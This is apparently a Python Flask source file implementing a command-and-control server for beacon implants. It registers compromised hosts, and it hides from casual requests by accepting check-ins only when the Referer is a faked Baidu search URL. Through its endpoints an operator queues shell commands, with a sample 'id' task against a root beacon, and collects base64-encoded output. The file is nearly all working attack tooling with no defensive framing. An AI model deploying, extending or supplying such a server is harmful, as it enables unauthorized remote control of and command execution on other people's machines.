from flask import Flask, request, jsonify
from werkzeug.serving import WSGIRequestHandler
import time, uuid
import datetime
from beacon import *
import base64
app = Flask(__name__)

TASK_LIST = [
    {
        'BEACON_ID':'1540',
        'TASK_ID': 0,
        'TASK_TYPE': 1,
        'TASK_DATA':'id',
        'TASK_RESPONSE':'',
        'HANDLE': True
    }
]

BEACON_LIST = [
    {
        'HASH':'1540',
        'TIMEOUT': '1',
        'IP':['127.0.0.1'],
        'UID':'0',
        'USERNAME':'root',
        'PID':'1540',
        'LAST_HEARTBEART': 2,
    }
]



@app.route('/')
def hello_world():
   return 'Hello World'


@app.route('/c2/', methods=['POST'])
def hello_c2():
   app.logger.info(request.form.to_dict())
   task_id = request.form.get('task_id')
   task_data = request.form.get('task_data')
   for task in TASK_LIST:
       app.logger.info(task)
       if task['TASK_ID'] == task_id:
           task['HANDLE'] = True
           task_data = base64.b64decode(task_data)
           task['TASK_RESPONSE'] = str(task_data)
           app.logger.info("success!")
   return 'Hello World'


@app.route('/push_task/', methods=['POST'])
def push_task():
    result = {
        'status' : 1,
        'msg':''
    }
    task = {
            'BEACON_ID':0,
            'TASK_ID': '',
            'TASK_TYPE': 1,
            'TASK_DATA':'',
            'TASK_RESPONSE':'',
            'HANDLE': False
    }
    task['TASK_ID'] = str(uuid.uuid4())
    task['TASK_DATA'] = request.form.get('task_data')
    task['TASK_TYPE'] = request.form.get('task_type')
    task['BEACON_ID'] = int(request.form.get('beacon_id'))
    TASK_LIST.append(task)
    result['status'] = 0
    result['msg'] = 'Success'
    return jsonify(result)

@app.route('/online/')
def beacon_online():
    if request.referrer == 'https://baidu.com/s?ie=utf-8&wd=':
        meta_data = request.args.get('data')
        meta_data = convert_beacon_meta_data(meta_data)
        meta_data['IP'] = convert_ip2str(meta_data['IP'])
        meta_data['REMOTE_ADDR'] = request.remote_addr
        app.logger.info(request.remote_addr)
        if check_beacon_list(meta_data['PID'], BEACON_LIST):
            update_beacon_heartbeat(meta_data['PID'], BEACON_LIST)
            app.logger.info(meta_data)
        else:
            add_beacon(meta_data, BEACON_LIST)
            app.logger.info(meta_data)
        result = send_beacon_task(meta_data['PID'], TASK_LIST)
        return result
    else:
        return 'OK'

@app.route('/beacons/')
def beacon_list():
    print(BEACON_LIST)
    return jsonify(BEACON_LIST)

@app.route('/tasks/')
def task_lists():
    return jsonify(TASK_LIST)

if __name__ == '__main__':
   WSGIRequestHandler.protocol_version = "HTTP/1.1"
   app.run(debug=True)
   # print(convert_beacon_meta_data("6AMAAG99AAABAqjAcnZuMHhzeQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="))
   # print(convert_ip2str(3232236033))